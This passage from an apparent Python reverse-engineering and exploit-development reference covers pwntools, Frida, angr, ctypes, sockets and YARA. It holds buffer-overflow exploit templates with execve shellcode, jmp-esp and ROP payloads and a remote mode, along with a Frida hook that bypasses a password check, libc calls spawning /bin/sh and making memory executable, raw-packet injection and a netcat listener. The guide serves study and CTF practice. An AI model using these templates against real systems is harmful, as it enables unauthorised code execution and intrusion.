                            mov edi, esp
                            push eax
                            push edi
                            mov edi, esp
                            mov al, 59
                            syscall
                             """)
            jmp_esp = asm('jmp esp')
            jmp_esp = next(file.search(jmp_esp))
            payload = flat(
                    asm('nop') * find_position(file),
                    next(file.search(asm('jmp esp'))),
                    asm('nop') * 16,
                    shellcode
                    )
            open('payload',"wb").write(payload)
            proc.sendlineafter(b"After something: ",payload)
            print(proc.recvall().decode('latin-1'))
            #proc.interactive()
        elif args.type == "debug":
            log.info(f"Starting local process: {args.binary} in GDB")
            #Write your gdb script here
            gdbscripts = """

            """
            file = ELF(args.binary)
            proc = file.process()
            pid = gdb.attach(proc,gdbscript=gdbscripts)
            payload = flat(b"A" * find_position(file),p32(file.functions.xxxxxxx.address),p32(0x0))

            open('payload',"wb").write(payload)
            proc.sendlineafter(b"After something: ",payload)
            print(proc.recvall().decode('latin-1'))
            #proc.interactive()
        elif args.type == "rop":
            log.info(f"Starting local process: {args.binary} implemented in ROP-chain")
            #This is a sample rop
            file = ELF(args.binary)
            proc = file.process()
            # payload = b"A" * find_position(file) + p32(file.functions.xxxxxxx.address) + p32(0x0)
            rop = ROP(file)
            rop.xxxxxxx("arg1","arg2")
            payload = flat({
                offset: rop.chain()
            })
            open('payload',"wb").write(payload)
            proc.sendlineafter(b'After something: ',payload)
            print(proc.recvall())
            #proc.interactive()
        
    elif args.mode == "remote":
        if not args.host or not args.port:
            parser.error("Remote mode requires both --host and --port arguments.")
        else:
            log.info(f"Connecting to remote target: {args.host}:{args.port}")
            file = ELF(args.binary)
            proc = remote(args.host,args.port)
            payload = flat(b"A" * find_position(file),p32(file.functions.xxxxxxx.address),p32(0x0))
            open('payload',"wb").write(payload)
            proc.sendlineafter(b"After something: ",payload)
            print(proc.recvall().decode('latin-1'))
            #proc.interactive()

def main():
    setup_target()

if __name__ == "__main__":
    main()

```
- `With GDB`
```python
from pwn import (p32,ELF,gdb)
def find_position(file):
    process = file.process()
    process.sendlineafter(b':', cyclic(200))
    process.wait()
    ip_offset = ""
    if ELF.bits == 32:
        ip_offset = cyclic_find(process.corefile.read(process.corefile.sp, 4))  # x64
    elif ELF.bits == 64:
        ip_offset = cyclic_find(process.corefile.pc)  # x86
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return int(ip_offset)

gdbscripts = """

"""
file = ELF(args.binary)
proc = file.process()
pid = gdb.attach(proc,gdbscript=gdbscripts)
payload = b"A" * find_position(file) + p32(file.functions.xxxxxxx.address) + p32(0x0)

write('payload',payload)
proc.sendlineafter(b"After something: ",payload)
print(proc.recvall().decode('latin-1'))
#proc.interactive()
```

- `With ROP-chains`
```python
from pwn import (p32,ELF,rop,gdb)
def find_position(file):
    process = file.process()
    process.sendlineafter(b':', cyclic(200))
    process.wait()
    ip_offset = ""
    if ELF.bits == 32:
        ip_offset = cyclic_find(process.corefile.read(process.corefile.sp, 4))  # x64
    elif ELF.bits == 64:
        ip_offset = cyclic_find(process.corefile.pc)  # x86
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return int(ip_offset)

file = ELF(args.binary)
proc = file.process()
# payload = b"A" * find_position(file) + p32(file.functions.xxxxxxx.address) + p32(0x0)
rop = ROP(file)
rop.xxxxxxx("arg1","arg2")
payload = flat({
offset: rop.chain()
})
proc.sendlineafter(b'After something: ',payload)
print(proc.recvall())
#proc.interactive()
```

> [!NOTE]
> You'd do the following mostly when it comes to x86 and x86/64
> x86/64: flat(junk,pop rdi,address/arguments,base address)
> x86: flat(junk,address,base address,another address/arguments)
> again base address in x86 can be anything like 0x0
> but in x86/64 you'd need to put the actual address of the base function which we call on behalf.

---

## 9. Frida - Dynamic Instrumentation

### `frida` — Dynamic code instrumentation toolkit

**Install:** `pip install frida frida-tools`

Frida injects a JavaScript engine into running processes. Python controls the injection and communicates with JS.

```python
import frida

# === Basic: Attach to process and hook ===

# JavaScript code to inject
jscode = """
Interceptor.attach(ptr("%s"), {
    onEnter: function(args) {
        console.log("[+] Hooked!");
        console.log("  arg0: " + args[0]);
        console.log("  arg1: " + args[1]);
    },
    onLeave: function(retval) {
        console.log("  retval: " + retval);
    }
});
"""

session = frida.attach("notepad.exe")    # attach by name
# session = frida.attach(1234)           # attach by PID
# session = frida.spawn(["program.exe"]) # spawn and attach

script = session.create_script(jscode)
script.load()

# Keep alive
import time
time.sleep(10)

# === Enumerate processes ===
device = frida.get_local_device()
processes = device.enumerate_processes()
for proc in processes:
    print(f"{proc.pid}: {proc.name}")

# === Enumerate modules ===
session = frida.attach("target")
modules = session.enumerate_modules()
for mod in modules:
    print(f"0x{mod.base_address:x} {mod.name} {mod.size}")

# Enumerate exports
exports = mod.enumerate_exports()
for exp in exports:
    print(f"  {exp.type} {exp.name} @ 0x{exp.address:x}")

# === Spawn mode (hook from the start) ===
device = frida.get_local_device()
pid = device.spawn(["program.exe", "arg1"])
session = device.attach(pid)
# ... create and load script ...
device.resume(pid)  # resume the spawned process

# === RPC between Python and JS ===
jscode = """
rpc.exports = {
    hello: function(name) {
        return "Hello " + name + " from JS!";
    },
    add: function(a, b) {
        return a + b;
    }
};
"""

script = session.create_script(jscode)
script.load()

result = script.exports.hello("world")  # calls JS function
print(result)

# === Stalker (instruction tracing) ===
stalker_code = """
Stalker.follow(Process.getCurrentThreadId(), {
    events: {
        call: true,     // trace calls
        ret: true,      // trace returns
        exec: false     // trace all instructions (expensive)
    },
    onReceive: function(events) {
        console.log(JSON.stringify(events));
    }
});
"""

# === Memory operations ===
# (from JS API, but can be triggered via Python)

js_memory = """
// Read memory
var buf = Memory.readByteArray(ptr("0x7fff0000"), 64);
console.log(hexdump(buf, { offset: 0, length: 64, header: true }));

// Write memory
Memory.writeByteArray(ptr("0x7fff0000"), [0x90, 0x90, 0x90]);

// Read pointer
var ptr = Memory.readPointer(ptr("0x7fff0000"));

// Read string
var str = Memory.readUtf8String(ptr("0x7fff0000"));
var wstr = Memory.readUtf16String(ptr("0x7fff0010"));

// Allocate and write
var mem = Memory.alloc(256);
Memory.writeUtf8String(mem, "Hello from Frida!");

// Find export
var addr = Module.findExportByName("kernel32.dll", "CreateFileA");
var addr2 = Module.getExportByName("kernel32.dll", "CreateFileA");

// Find base address
var base = Module.findBaseAddress("kernel32.dll");
"""

# === Java Hook (Android) ===
java_code = """
Java.perform(function() {
    var MainActivity = Java.use("com.example.MainActivity");

    MainActivity.secretFunction.implementation = function() {
        console.log("[+] secretFunction called!");
        return "hooked!";
    };

    // Hook constructor
    var HashMap = Java.use("java.util.HashMap");
    HashMap.$init.overload().implementation = function() {
        console.log("[+] HashMap created");
        return this.$init();
    };

    // Hook with arguments
    MainActivity.checkPassword.implementation = function(password) {
        console.log("[+] Password attempt: " + password);
        return true; // always succeed
    };
});
"""

# === Objective-C Hook (iOS/macOS) ===
objc_code = """
ObjC.perform(function() {
    var MyClass = ObjC.classes.MyClass;
    var oldImp = MyClass.secretMethod;
    Interceptor.attach(oldImp, {
        onEnter: function(args) {
            console.log("[+] secretMethod called");
        }
    });
});
"""
```

### frida-tools CLI Commands

```bash
# List processes
frida-ps
frida-ps -U        # USB device

# Trace functions
frida-trace -i "recv*" -i "send*" target
frida-trace -i "CreateFile*" notepad.exe

# Discover classes (Android)
frida-discover -U com.example.app

# List devices
frida-ls-devices

# Kill process
frida-kill target
```

### Tips & Tricks

- Use `device.resume(pid)` after `spawn()` or the process stays frozen
- `Interceptor.attach()` can hook already-loaded functions AND functions loaded later
- For anti-Frida bypass: hook `pthread_create` to neutralize watchdog threads
- Use `frida-trace -i '*Open*'` to trace all functions containing "Open"
- Memory read/write from JS is faster than Python → keep data operations in JS
- Use RPC to send complex data between Python and JS
- `frida.get_usb_device()` connects to Android/iOS over USB
- `Module.enumerateExports()` is great for finding hidden API functions

---

## 10. Angr - Binary Analysis Platform

### `angr` — Binary analysis with symbolic execution

**Install:** `pip install angr` (note: large download, includes Z3 solver)

Angr enables symbolic execution, concolic analysis, decompilation, CFG recovery, and more.

```python
import angr
import claripy

# === Load binary ===
proj = angr.Project('./crackme', auto_load_libs=False)

# Basic binary info
print(f"Arch: {proj.arch}")
print(f"Entry: 0x{proj.entry:x}")
print(f"Filename: {proj.filename}")

# === Control Flow Graph ===
cfg = proj.analyses.CFGFast()
for func_addr, func in cfg.kb.functions.items():
    print(f"0x{func_addr:x}: {func.name}")

# === Symbolic Execution: Find input that reaches a target ===

# Create initial state
state = proj.factory.entry_state()

# Create simulation manager
simgr = proj.factory.simgr(state)

# Explore: find "Win" path, avoid "Fail" path
simgr.explore(
    find=lambda s: b"Correct" in s.posix.dumps(1),
    avoid=lambda s: b"Wrong" in s.posix.dumps(1)
)

if simgr.found:
    found = simgr.found[0]
    password = found.posix.dumps(0)  # stdin
    print(f"Found password: {password}")

# === Symbolic input ===

# Create symbolic stdin
sym_size = 20
sym_stdin = claripy.BVS('input', sym_size * 8)
state = proj.factory.entry_state(stdin=sym_stdin)

# Constrain to printable ASCII
for byte in sym_stdin.chop(8):
    state.solver.add(byte >= ord(' '))
    state.solver.add(byte <= ord('~'))

# Explore
simgr = proj.factory.simgr(state)
simgr.explore(find=lambda s: b"Correct" in s.posix.dumps(1))

if simgr.found:
    solution = simgr.found[0].solver.eval(sym_stdin, cast_to=bytes)
    print(f"Solution: {solution}")

# === Symbolic command-line args ===
arg1 = claripy.BVS('arg1', 10 * 8)
arg2 = claripy.BVS('arg2', 20 * 8)
state = proj.factory.entry_state(args=['./crackme', arg1, arg2])

# === Hook a function ===
@proj.hook(0x400512)  # address to hook
def my_hook(state):
    print(f"Hooked at 0x{state.addr:x}")
    state.regs.rax = 0  # override return value
    # skip to next instruction after call
    state.regs.rip = state.regs.rip + 5  # depends on instruction size

# === Decompilation ===
# angr can decompile functions to C-like pseudocode
cfg = proj.analyses.CFGFast()
main_func = cfg.kb.functions['main']
dec = proj.analyses.Decompiler(main_func)

if dec.codegen:
    print(dec.codegen.text)

# === Callable (execute a function concretely) ===
# Create a callable interface to a function
func = proj.factory.callable(0x400000 + 0x1234)  # function address
result = func(10, 20)  # call with arguments

# === Automatic crash analysis ===
# angr can explore crash paths
state = proj.factory.entry_state()
simgr = proj.factory.simgr(state)

# Step until crash
while len(simgr.active) > 0:
    simgr.step()
    if simgr.crashed:
        crash_state = simgr.crashed[0]
        print(f"Crash at 0x{crash_state.addr:x}")
        break

# === Retrieving static data ===
# Read bytes from binary
data = proj.loader.memory.load(0x400000, 0x100)

# Find string
binsh = next(proj.loader.memory.find(b'/bin/sh'))

# === VEX IR lifting ===
# angr lifts machine code to VEX IR (intermediate representation)
block = proj.factory.block(0x400000 + 0x1000)
for stmt in block.vex.statements:
    print(stmt)
```

### Tips & Tricks

- `auto_load_libs=False` speeds up loading significantly
- Constrain symbolic input to printable ASCII to avoid non-printable solutions
- For simple crackmes, `simgr.explore(find=addr, avoid=addr)` with addresses is fastest
- Use `simgr.one_active` to get the only active state for single-path analysis
- Angr is very memory-hungry — use `simgr.step()` manually instead of `explore()` for complex binaries
- Hook libc functions (`proj.hook(addr)`) to speed up emulation (e.g., `puts`, `scanf`)
- Use `claripy.BVS` (bit-vector symbolic) and `claripy.BVV` (bit-vector concrete value)

---

## 11. Ctypes - C Foreign Function Library

### `ctypes` — Call C functions, define C structs, manipulate memory

Standard library module. Essential for calling Windows API, libc functions, and raw memory manipulation.

```python
import ctypes
from ctypes import *

# === Load libraries ===
libc = CDLL('libc.so.6')                 # Linux
kernel32 = WinDLL('kernel32.dll')        # Windows (stdcall)
user32 = WinDLL('user32.dll')            # Windows (stdcall)
msvcrt = CDLL('msvcrt.dll')             # Windows (cdecl)

# === Call C functions ===
libc.printf(b"Hello %s\n", b"world")     # calling printf
libc.puts(b"hello from puts")

# === Calling Windows API ===
# MessageBoxA
user32.MessageBoxA(None, b"Hello", b"Title", 0)

# === C Data Types ===
# Basic types
c_int(42)                # int
c_char(b'A')             # char
c_char_p(b"hello")       # char*
c_void_p(0xdeadbeef)     # void*
c_ubyte(255)             # unsigned char
c_uint(0xFFFFFFFF)       # unsigned int
c_short(0x7FFF)          # short
c_ushort(0xFFFF)         # unsigned short
c_long(0x7FFFFFFF)       # long
c_ulong(0xFFFFFFFF)      # unsigned long
c_longlong(0x7FFF)       # long long
c_float(3.14)            # float
c_double(3.14)           # double
c_bool(True)             # _Bool
c_size_t(1024)           # size_t

# === Array types ===
# Create an array type
IntArray10 = c_int * 10
arr = IntArray10(1, 2, 3)
arr[0]  # 1
arr[4]  # 0 (uninitialized)

# Create from list
arr = (c_ubyte * 4)(0x90, 0x90, 0x90, 0x90)

# === Pointer types ===
i = c_int(42)
p = pointer(i)           # create pointer
p.contents               # -> c_int(42)
p[0]                     # -> 42

# Cast arbitrary address to pointer
ptr = cast(0x7fff0000, POINTER(c_int))
ptr[0]                   # read int at that address

# === Structure definitions ===
class PE_HEADER(Structure):
    _fields_ = [
        ("e_magic",    c_uint16),   # 'MZ'
        ("e_cblp",     c_uint16),
        ("e_cp",       c_uint16),
        ("e_crlc",     c_uint16),
        ("e_cparhdr",  c_uint16),
        ("e_minalloc", c_uint16),
        ("e_maxalloc", c_uint16),
        ("e_ss",       c_uint16),
        ("e_sp",       c_uint16),
        ("e_csum",     c_uint16),
        ("e_ip",       c_uint16),
        ("e_cs",       c_uint16),
        ("e_lfarlc",   c_uint16),
        ("e_ovno",     c_uint16),
        ("e_res",      c_uint16 * 4),
        ("e_oemid",    c_uint16),
        ("e_oeminfo",  c_uint16),
        ("e_res2",     c_uint16 * 10),
        ("e_lfanew",   c_uint32),    # offset to PE header
    ]

# Byte order for structs
class LittleStruct(LittleEndianStructure):
    _fields_ = [("x", c_uint32), ("y", c_uint16)]

class BigStruct(BigEndianStructure):
    _pack_ = 1  # packed (no padding)
    _fields_ = [("x", c_uint32), ("y", c_uint16)]

# === Nested structures ===
class Rect(Structure):
    _fields_ = [("left", c_long), ("top", c_long),
                ("right", c_long), ("bottom", c_long)]

class WindowInfo(Structure):
    _fields_ = [
        ("size", c_uint32),
        ("title", c_char * 256),
        ("rect", Rect),
        ("flags", c_uint32),
    ]

# === Union ===
class Value(Union):
    _fields_ = [
        ("i", c_int),
        ("f", c_float),
        ("b", c_ubyte * 4),
    ]

v = Value()
v.i = 0x41424344
v.b  # -> byte representation

# === Raw Memory Operations ===
# Read memory at address
buf = (c_ubyte * 256).from_address(0x7fff0000)

# Write memory at address
memmove(0x7fff0000, b'\x90\x90\x90\x90', 4)
memmove(id(my_bytes_object) + 32, b'\x41\x41\x41\x41', 4)  # dangerous!

# Get address of Python object
addressof(c_int(42))

# Allocate memory
buf = create_string_buffer(256)   # mutable char buffer
ptr = cast(buf, c_void_p)

# Call with custom argument types
libc.printf.argtypes = [c_char_p, c_char_p]
libc.printf.restype = c_int

# === Calling functions returning structs ===
# Need to set restype to the struct type
class MyStruct(Structure):
    _fields_ = [("x", c_int), ("y", c_int)]

libc.get_struct.restype = MyStruct
result = libc.get_struct()

# === Function pointer callbacks ===
CALLBACK = CFUNCTYPE(None, c_int, c_void_p)

def my_callback(code, param):
    print(f"Callback: {code}")

callback_func = CALLBACK(my_callback)

# === Practical: call srand/rand (for predicting RNG) ===
libc.srand(12345)
val = libc.rand()
print(f"srand(12345) -> rand() = {val}")

# === Practical: Windows API — OpenProcess ===
kernel32.OpenProcess.argtypes = [c_uint32, c_bool, c_uint32]
kernel32.OpenProcess.restype = c_void_p

PROCESS_ALL_ACCESS = 0x1F0FFF
hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, 1234)

# === Practical: Create a buffer for shellcode ===
buf = (c_ubyte * len(shellcode)).from_buffer_copy(shellcode)
# Mark as executable (Unix: mprotect, Windows: VirtualProtect)
```

### Using libc for Exploitation

```python
from ctypes import *

libc = CDLL('libc.so.6')

# system()
libc.system(b'/bin/sh')

# mprotect() — make memory executable
# int mprotect(void *addr, size_t len, int prot)
libc.mprotect.argtypes = [c_void_p, c_size_t, c_int]
libc.mprotect.restype = c_int
PROT_READ = 0x1
PROT_WRITE = 0x2
PROT_EXEC = 0x4
libc.mprotect(0x7fff0000, 4096, PROT_READ | PROT_WRITE | PROT_EXEC)

# mmap() — allocate executable memory
# void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset)
libc.mmap.argtypes = [c_void_p, c_size_t, c_int, c_int, c_int, c_size_t]
libc.mmap.restype = c_void_p
MAP_ANONYMOUS = 0x20
MAP_PRIVATE = 0x02
mem = libc.mmap(None, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
                MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)
```

### Tips & Tricks

- `WinDLL` uses stdcall (Windows API), `CDLL` uses cdecl (libc, msvcrt)
- Always set `argtypes` and `restype` — wrong types cause subtle bugs or crashes
- `create_string_buffer()` is safer than manual memory allocation for strings
- `from_address()` reads memory at an arbitrary address — use with caution
- Use `CFUNCTYPE` to create callbacks that C code can call
- `POINTER(type)` creates a pointer type; `pointer(obj)` creates a pointer to an object
- `memmove(dst, src, size)` copies raw bytes (like `memcpy` but handles overlap)
- Casting `id(obj) + offset` lets you access internal Python object memory
- On Windows, `WinDLL('ntdll.dll')` gives access to NT API functions

---

## 12. Socket - Low-Level Networking

### `socket` — Low-level networking interface

Standard library module. Essential for raw packet crafting, sniffing, and network protocol work.

```python
import socket
import struct

# === TCP Client ===
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('example.com', 80))
s.send(b'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n')
response = s.recv(4096)
s.close()

# === TCP Server ===
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 4444))
s.listen(5)
conn, addr = s.accept()
data = conn.recv(1024)
conn.send(b'ok')
conn.close()

# === UDP ===
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'hello', ('target.com', 1234))
data, addr = s.recvfrom(1024)

# === Raw Socket (Packet Sniffing - Linux, needs root) ===
import socket

# AF_PACKET (Linux) — capture at data link layer (Ethernet)
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
# ETH_P_ALL = 3 — capture all protocols

# or AF_INET + SOCK_RAW — capture IP layer
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

s.settimeout(1)
try:
    while True:
        packet, addr = s.recvfrom(65535)
        # Parse Ethernet header (14 bytes)
        eth_header = packet[:14]
        eth = struct.unpack('!6s6sH', eth_header)
        dest_mac = eth[0].hex(':')
        src_mac = eth[1].hex(':')
        eth_type = eth[2]

        # Parse IP header (20 bytes without options)
        ip_header = packet[14:34]
        iph = struct.unpack('!BBHHHBBH4s4s', ip_header)
        version_ihl = iph[0]
        ihl = (version_ihl & 0xF) * 4
        ttl = iph[5]
        protocol = iph[6]          # 6=TCP, 17=UDP, 1=ICMP
        src_ip = socket.inet_ntoa(iph[8])
        dst_ip = socket.inet_ntoa(iph[9])

        if protocol == 6:  # TCP
            tcp_header = packet[14+ihl:14+ihl+20]
            tcph = struct.unpack('!HHIIBBHHH', tcp_header)
            src_port = tcph[0]
            dst_port = tcph[1]
            print(f"TCP {src_ip}:{src_port} -> {dst_ip}:{dst_port}")

except:
    s.close()

# === Raw Socket (Packet Injection — Linux, needs root) ===
# Craft and send a custom TCP SYN packet

def checksum(data):
    if len(data) % 2:
        data += b'\x00'
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i+1]
    total = (total >> 16) + (total & 0xFFFF)
    total += (total >> 16)
    return ~total & 0xFFFF

def create_ip_header(src, dst, proto):
    version_ihl = 0x45
    tos = 0
    total_length = 40  # IP(20) + TCP(20)
    identification = 0x1234
    flags_offset = 0
    ttl = 64
    protocol = proto
    checksum_val = 0
    src_ip = socket.inet_aton(src)
    dst_ip = socket.inet_aton(dst)

    header = struct.pack('!BBHHHBBH4s4s',
        version_ihl, tos, total_length, identification,
        flags_offset, ttl, protocol, checksum_val,
        src_ip, dst_ip)

    checksum_val = checksum(header)
    header = struct.pack('!BBHHHBBH4s4s',
        version_ihl, tos, total_length, identification,
        flags_offset, ttl, protocol, checksum_val,
        src_ip, dst_ip)
    return header

def create_tcp_syn(src_port, dst_port):
    seq = 0x1000
    ack_seq = 0
    data_offset = 0x50  # 5 words (20 bytes)
    flags = 0x02        # SYN
    window = 0xFFFF
    checksum_val = 0
    urgent = 0

    header = struct.pack('!HHIIBBHHH',
        src_port, dst_port, seq, ack_seq,
        data_offset, flags, window, checksum_val, urgent)
    return header

# Create and send
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)  # we provide IP header

ip_hdr = create_ip_header('192.168.1.1', '192.168.1.100', socket.IPPROTO_TCP)
tcp_hdr = create_tcp_syn(12345, 80)
packet = ip_hdr + tcp_hdr
s.sendto(packet, ('192.168.1.100', 0))
s.close()

# === ICMP Echo (Ping) ===
import socket, struct, time, os

def create_icmp_echo():
    icmp_type = 8          # Echo Request
    code = 0
    checksum_val = 0
    identifier = os.getpid() & 0xFFFF
    sequence = 1
    payload = struct.pack('!d', time.time())

    header = struct.pack('!BBHHH', icmp_type, code, checksum_val,
                         identifier, sequence)
    # Calculate checksum with payload
    cksum_data = header + payload
    checksum_val = checksum(cksum_data)
    header = struct.pack('!BBHHH', icmp_type, code, checksum_val,
                         identifier, sequence)
    return header + payload

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
s.settimeout(2)
s.sendto(create_icmp_echo(), ('8.8.8.8', 0))
response, addr = s.recvfrom(1024)
s.close()

# === Byte Order Conversion ===
socket.ntohl(0x12345678)       # network to host (32-bit)
socket.htonl(0x12345678)       # host to network (32-bit)
socket.ntohs(0x1234)           # network to host (16-bit)
socket.htons(0x1234)           # host to network (16-bit)

# === Resolve hostnames ===
socket.gethostbyname('example.com')     # -> '93.184.216.34'
socket.gethostbyname_ex('example.com')  # -> ('example.com', [], ['93.184.216.34'])
socket.gethostbyaddr('8.8.8.8')         # -> ('dns.google', [], ['8.8.8.8'])

# === Non-blocking I/O ===
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setblocking(False)
s.settimeout(5.0)  # or use timeout
```

### Tips & Tricks

- Raw sockets require root (Linux) or admin (Windows — limited support)
- On Linux, use `AF_PACKET`, `SOCK_RAW` for link-layer (Ethernet) access
- `IP_HDRINCL=1` tells kernel not to add its own IP header
- Checksum calculation is manual for raw TCP/UDP — use the Internet checksum algorithm
- For packet crafting libraries, also check `scapy` (better for complex protocols)
- `AF_INET6` for IPv6 raw sockets
- `selectors` module for efficient multiplexing of multiple sockets

---

## 13. Useful Standard Library Modules

### `hashlib` — Cryptographic hashing

```python
import hashlib

# MD5
hashlib.md5(b'data').hexdigest()
# SHA1
hashlib.sha1(b'data').hexdigest()
# SHA256
hashlib.sha256(b'data').hexdigest()

# HMAC
import hmac
hmac.new(b'key', b'msg', hashlib.sha256).hexdigest()

# Update incrementally
h = hashlib.sha256()
h.update(b'chunk1')
h.update(b'chunk2')
h.digest()
```

### `base64` — Base64 encoding

```python
import base64

base64.b64encode(b'\xde\xad\xbe\xef')           # -> b'3q2+7w=='
base64.b64decode('3q2+7w==')                     # -> b'\xde\xad\xbe\xef'
base64.urlsafe_b64encode(b'\xfb\xff\xff\xff')    # URL-safe variant
base64.b64encode(hashlib.md5(b'data').digest())  # common pattern
```

### `zlib` — Compression

```python
import zlib

compressed = zlib.compress(data)
decompressed = zlib.decompress(compressed)
zlib.crc32(data)                    # CRC32 checksum
zlib.decompress(compressed, -zlib.MAX_WBITS)  # raw deflate (no header)
```

### `pickle` / `json` — Serialization

```python
import pickle, json

# Python object serialization
data = pickle.dumps(obj)
obj = pickle.loads(data)

# JSON
data = json.dumps({"key": "value"}, indent=2)
obj = json.loads('{"key": "value"}')
```

### `os` & `sys` — System interaction

```python
import os, sys

os.getpid()                       # current PID
os.kill(pid, 9)                   # SIGKILL
os.system('command')              # run shell command
os.popen('command').read()        # capture output

sys.byteorder                     # 'little' or 'big'
sys.maxsize                       # max addressable memory
sys.modules                       # loaded modules
sys.argv                          # command line args
```

### `subprocess` — Shell execution

```python
import subprocess

# Run and capture output
result = subprocess.run(['ls', '-la'], capture_output=True)
result.stdout                     # bytes of stdout
result.returncode                 # exit code

# Pipe
proc = subprocess.Popen(['nc', '-lvp', '4444'],
                       stdin=subprocess.PIPE,
                       stdout=subprocess.PIPE)
proc.communicate(b'input')
```

### `ctypes.wintypes` — Windows types

```python
from ctypes import wintypes

# Specific Windows types:
# wintypes.HANDLE, wintypes.HWND, wintypes.HINSTANCE
# wintypes.DWORD, wintypes.LPDWORD, wintypes.BYTE
# wintypes.WCHAR, wintypes.LPWSTR, wintypes.LPCWSTR
# wintypes.UINT, wintypes.LPVOID, wintypes.BOOL
```

### `threading` / `multiprocessing`

```python
import threading, multiprocessing

# Threading (shared memory)
t = threading.Thread(target=fn, args=(arg,))
t.start()
t.join()

# Multiprocessing (isolated memory)
p = multiprocessing.Process(target=fn, args=(arg,))
p.start()
p.join()
```

### `argparse` — Argument parsing

```python
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-p', '--port', type=int, default=4444)
parser.add_argument('target')
args = parser.parse_args()
print(args.port, args.target)
```

### `logging` — Debug output

```python
import logging

logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s %(levelname)s %(message)s')
logging.debug('debug message')
logging.info('info message')
logging.warning('warning')
```

### `itertools` — Iteration tools

```python
import itertools

itertools.cycle(b'\x00\x01\x02')       # infinite cycling
itertools.count(start=0, step=1)       # infinite counter
itertools.product(range(256), repeat=4) # all 4-byte combinations
```

### `re` — Regular expressions

```python
import re

re.findall(b'[\x20-\x7e]{4,}', data)   # find all printable strings >= 4 chars
re.search(rb'[A-Za-z0-9+/=]{20,}', data)  # find base64-like strings
re.sub(b'\\x90{4,}', b'\\x90' * 100, data) # normalize NOP sleds
```

---

## 14. Cheatsheet & Quick Reference

| Task | Module | Key Function |
|---|---|---|
| Parse PE file | `pefile` | `pefile.PE(path)` |
| Parse ELF file | `pyelftools` | `ELFFile(file)` |
| Parse any binary | `lief` | `lief.parse(path)` |
| Disassemble x86 | `capstone` | `Cs(CS_ARCH_X86, CS_MODE_64)` |
| Assemble x86 | `keystone` | `Ks(KS_ARCH_X86, KS_MODE_64)` |
| Emulate code | `unicorn` | `Uc(UC_ARCH_X86, UC_MODE_64)` |
| Exploit dev | `pwntools` | `from pwn import *` |
| Hook process | `frida` | `frida.attach('name')` |
| Symbolic exec | `angr` | `angr.Project('./bin')` |
| Call C functions | `ctypes` | `CDLL('libc.so.6')` |
| Pack binary data | `struct` | `struct.pack('<I', val)` |
| Raw networking | `socket` | `socket.socket(AF_INET, SOCK_RAW)` |
| Hash data | `hashlib` | `hashlib.sha256(data).digest()` |
| Base64 encode | `base64` | `base64.b64encode(data)` |
| CRC32 | `binascii` | `binascii.crc32(data)` |
| Compression | `zlib` | `zlib.compress(data)` |

### Byte Order Markers

```
Prefix | Meaning     | struct example
-------+-------------+---------------
<      | Little-endian | '<I' = LE uint32
>      | Big-endian    | '>I' = BE uint32
!      | Network (BE)  | '!H' = network uint16
@      | Native        | '@i' = native int
=      | Standard      | '=I' = standard uint32
```

### Quick Packing (no import needed)

```python
# Python 3.2+ — int <-> bytes without struct
val = int.from_bytes(b'\xef\xbe\xad\xde', 'little')  # 0xdeadbeef
b = (0xdeadbeef).to_bytes(4, 'little')                # b'\xef\xbe\xad\xde'
b = (0xdeadbeef).to_bytes(4, 'big')                   # b'\xde\xad\xbe\xef'
```

### Common Patterns

```python
# Hex dump a buffer
def hexdump(data, addr=0):
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hex_str = ' '.join(f'{b:02x}' for b in chunk)
        ascii_str = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in chunk)
        print(f'{addr+i:08x}  {hex_str:48s}  {ascii_str}')

# Read file as bytes
with open('file', 'rb') as f:
    data = f.read()

# Write bytes to file
with open('file', 'wb') as f:
    f.write(data)

# XOR decoder
def xor(data, key):
    return bytes(b ^ key for b in data)

# ROT encoder
def rot(data, n):
    return bytes((b + n) & 0xFF for b in data)
```

---

---

## 15. YARA — Pattern Matching for Malware Classification

YARA identifies malware by defining textual or binary patterns. `yara-python` lets you compile and scan from code.

```python
import yara

# Compile rules from source
rules = yara.compile(source='''
rule SuspiciousStrings {
    strings:
        $a = "VirtualAllocEx"
        $b = "WriteProcessMemory"
        $c = "CreateRemoteThread"
    condition:
        all of them
}
''')

# Scan a buffer
matches = rules.match(data=open('sample.exe', 'rb').read())
for m in matches:
    print(f'[+] Rule triggered: {m.rule}')
    for s in m.strings:
        for inst in s.instances:
            print(f'    {s.identifier} @ {inst.offset:#x} = {inst.matched_length} bytes')
```

**External variables & modules:**

```python
rules = yara.compile(source='''
import "pe"

rule IsPacked {
    condition:
        pe.section_anomalies or pe.characteristics & pe.DLL
}
''')

# Pass external variables at scan time
matches = rules.match(data=buf, externals={'filename': 'evil.exe'})
```

**Scanning directories with callbacks:**

```python
def callback(data):
    if data['matches']:
        print(f"[!] Match in {data['filename']}: {data['rule']}")
    return yara.CALLBACK_CONTINUE

rules = yara.compile(filepath='/path/to/rules.yara')
rules.match('/path/to/dir', callback=callback, threads=4)
```

**Use cases:**
- Classify malware families by unique byte patterns
- Detect packers, cryptors, protectors via section anomalies
- Hunt for embedded config blocks (C2 IPs, RC4 keys, mutex names)
- Scan memory dumps from Volatility for known signatures

---

## 16. Volatility 3 — Memory Forensics Framework

Volatility 3 is a complete rewrite in Python 3 for analyzing RAM dumps. Its plugin-based architecture makes it extensible and scriptable.

**Basic CLI usage:**
```
